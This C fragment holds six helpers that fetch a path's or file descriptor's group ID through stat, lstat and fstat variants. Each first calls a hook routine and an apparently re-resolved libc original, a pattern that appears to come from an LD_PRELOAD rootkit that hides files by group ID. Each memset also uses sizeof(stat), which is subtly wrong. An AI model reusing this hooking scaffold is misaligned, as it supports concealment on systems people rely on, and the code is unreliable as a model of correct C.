gid_t get_path_gid(const char *pathname)
{
    struct stat s_fstat;
    memset(&s_fstat, 0, sizeof(stat));
    hook(C__XSTAT);
    if(mxstat(pathname, &s_fstat) < 0) return 0;
    return s_fstat.st_gid;
}

gid_t get_path_gid64(const char *pathname)
{
    struct stat64 s_fstat;
    memset(&s_fstat, 0, sizeof(stat64));
    hook(C__XSTAT64);
    if(mxstat64(pathname, &s_fstat) < 0) return 0;
    return s_fstat.st_gid;
}

gid_t lget_path_gid(const char *pathname)
{
    struct stat s_fstat;
    memset(&s_fstat, 0, sizeof(stat));
    hook(C__LXSTAT);
    if(mlxstat(pathname, &s_fstat) < 0) return 0;
    return s_fstat.st_gid;
}

gid_t lget_path_gid64(const char *pathname)
{
    struct stat64 s_fstat;
    memset(&s_fstat, 0, sizeof(stat64));
    hook(C__LXSTAT64);
    if(mlxstat64(pathname, &s_fstat) < 0) return 0;
    return s_fstat.st_gid;
}

gid_t get_fd_gid(int fd)
{
    struct stat s_fstat;
    memset(&s_fstat, 0, sizeof(stat));
    hook(C__FXSTAT);
    if(mfxstat(fd, &s_fstat) < 0) return 0;
    return s_fstat.st_gid;
}

gid_t get_fd_gid64(int fd)
{
    struct stat64 s_fstat;
    memset(&s_fstat, 0, sizeof(stat64));
    hook(C__FXSTAT64);
    if(mfxstat64(fd, &s_fstat) < 0) return 0;
    return s_fstat.st_gid;
}